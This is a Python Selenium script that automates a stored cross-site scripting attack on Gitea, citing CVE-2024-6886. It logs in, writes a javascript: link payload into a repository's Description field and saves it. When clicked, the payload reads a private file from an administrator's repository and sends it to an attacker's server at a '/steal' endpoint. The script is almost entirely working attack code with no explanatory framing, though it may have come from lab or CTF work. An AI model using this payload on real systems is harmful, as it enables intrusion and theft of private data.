from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

##
## https://nvd.nist.gov/vuln/detail/CVE-2024-6886
##

# Configure your WebDriver (Chrome in this example)
driver = webdriver.Chrome(executable_path='/path/to/chromedriver')

# 1. Log in to Gitea
driver.get("http://localhost:3000/user/login")
time.sleep(2)  # wait for the page to load

# Locate and fill in login credentials (update selectors and credentials as needed)
driver.find_element(By.NAME, "user_name").send_keys("your_username")
driver.find_element(By.NAME, "password").send_keys("your_password")
driver.find_element(By.NAME, "submit").click()
time.sleep(2)

# 2. Navigate to the repository settings page to inject the payload
driver.get("http://localhost:3000/your_username/your_repo/settings")
time.sleep(2)

# 3. Locate the Description field (adjust the selector as needed)
description_field = driver.find_element(By.ID, "repo-description")

# Construct the XSS payload. This version is designed to fetch a particular privileged target.. and send it to your server.
payload = (
    '<a href="javascript:fetch(\'http://localhost:3000/administrator/mgmt/raw/branch/main/things.md\')'
    '.then(r=>r.text()).then(d=>fetch(\'http://10.10.x.x:8000/steal?data=\'+encodeURIComponent(d)))">'
    'XSS Test</a>'
)

# Clear the field and inject the payload
description_field.clear()
description_field.send_keys(payload)

# Save the settings (adjust the selector or click method as needed)
driver.find_element(By.XPATH, "//button[contains(text(),'Save')]").click()

# Close the driver if you want to end the injection automation
time.sleep(2)
driver.quit()

##
##
